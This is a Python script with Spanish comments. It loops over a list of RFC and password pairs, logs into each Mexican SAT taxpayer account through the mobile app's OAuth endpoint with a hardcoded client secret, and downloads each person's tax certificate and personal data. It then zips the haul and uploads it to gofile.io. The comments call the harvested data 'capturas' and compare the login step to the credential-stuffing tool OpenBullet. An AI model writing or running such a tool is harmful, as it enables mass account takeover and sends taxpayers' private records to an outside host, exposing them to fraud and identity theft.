import requests
import base64
import os
import zipfile
import re

# Credenciales de la App Oficial
CLIENT_ID = "fe7bad7c-6dea-4834-8f40-1fa99620613b"
CLIENT_SECRET = "vhHgI-1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYHOlo6Fb9pnLXZNWwuGnUj-zijmumfWOGUhlaLer8LACwNA"

def limpiar_texto(texto):
    # Elimina caracteres invisibles (BOM, basura de codificación)
    return re.sub(r'[^\x20-\x7E]', '', texto).strip()

def run():
    if not os.path.exists("usuarios.txt"):
        print("? Archivo usuarios.txt no encontrado.")
        return

    os.makedirs("PDFS_SAT", exist_ok=True)
    reporte_txt = "=== REPORTE DE CAPTURAS SAT ===\n\n"
    
    with open("usuarios.txt", "r", encoding="utf-8", errors="ignore") as f:
        lineas = f.readlines()

    session = requests.Session()

    for linea in lineas:
        linea = linea.strip()
        if not linea or ":" not in linea: continue
        
        partes = linea.split(":", 1)
        rfc = limpiar_texto(partes[0]).upper()
        pwd = partes[1].strip()
        if len(rfc) < 12: continue

        print(f"?? Procesando: {rfc}")

        # 1. AUTENTICACIÓN (OAuth2 Estricto)
        token_url = "https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token"
        
        # El SAT espera el RFC y PASS en el body
        payload = {
            "grant_type": "password",
            "username": rfc,
            "password": pwd,
            "scope": "satmovil"
        }
        
        # El client_id y secret se envían como Basic Auth para evitar 'invalid_client'
        # Esto es lo que OpenBullet hace internamente cuando pones las credenciales
        auth_header = (CLIENT_ID, CLIENT_SECRET)
        
        headers_auth = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/104.0.0.0 Safari/537.36",
            "Accept": "*/*"
        }
        
        try:
            r_auth = session.post(token_url, data=payload, auth=auth_header, headers=headers_auth, timeout=20)
            
            if r_auth.status_code != 200:
                print(f"  [!] Error {r_auth.status_code}: {r_auth.text}")
                continue
                
            token = r_auth.json().get("access_token")
            if not token: continue

            headers_api = {
                "Authorization": f"bearer {token}",
                "User-Agent": "Dart/3.5 (dart:io)",
                "Accept-Encoding": "gzip"
            }

            # 2. DESCARGAR PDF
            pdf_url = f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}"
            r_pdf = session.get(pdf_url, headers=headers_api, timeout=20)
            
            if r_pdf.status_code == 200:
                pdf_b64 = r_pdf.json().get("constancia")
                if pdf_b64:
                    with open(f"PDFS_SAT/{rfc}.pdf", "wb") as f_pdf:
                        f_pdf.write(base64.b64decode(pdf_b64))
                    print(f"  [+] PDF obtenido")

            # 3. CAPTURAR DATOS
            info_url = f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}"
            r_info = session.get(info_url, headers=headers_api, timeout=20)
            
            if r_info.status_code == 200:
                info = r_info.json()
                reporte_txt += f"RFC: {rfc} | NOMBRE: {info.get('tradename')} | STATUS: {info.get('statusDescription')}\n"
                print(f"  [+] Datos capturados")

        except Exception as e:
            print(f"  [!] Error en {rfc}: {str(e)}")

    # 4. COMPRIMIR Y SUBIR A GOFILE
    if os.listdir("PDFS_SAT"):
        with open("CAPTURAS.txt", "w", encoding="utf-8") as f_cap:
            f_cap.write(reporte_txt)

        with zipfile.ZipFile("RESULTADOS_SAT.zip", 'w') as zipf:
            zipf.write("CAPTURAS.txt")
            for file in os.listdir("PDFS_SAT"):
                zipf.write(f"PDFS_SAT/{file}", file)

        server_name = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
        with open("RESULTADOS_SAT.zip", "rb") as f_zip:
            up = requests.post(f"https://{server_name}.gofile.io/contents/uploadfile", files={"file": f_zip}).json()
        print(f"\n? TODO LISTO: {up['data']['downloadPage']}")
    else:
        print("? No se pudo procesar ninguna cuenta.")

if __name__ == "__main__":
    run()
